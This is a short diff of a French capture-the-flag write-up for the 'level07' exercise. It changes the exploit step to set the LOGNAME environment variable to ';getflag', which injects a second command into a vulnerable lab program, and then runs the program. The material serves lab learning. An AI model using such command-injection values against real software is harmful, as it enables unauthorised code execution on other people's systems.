@@ -33,7 +33,7 @@ strings level07
 Maintenant, nous pouvons exploiter le programme en modifiant la variable d'environnement LOGNAME. Nous la définissons sur "${getflag}" pour exécuter la commande getflag :
 
 ```bash
-export LOGNAME='${getflag}'
+export LOGNAME=';getflag'
 ./level07
 ```
 
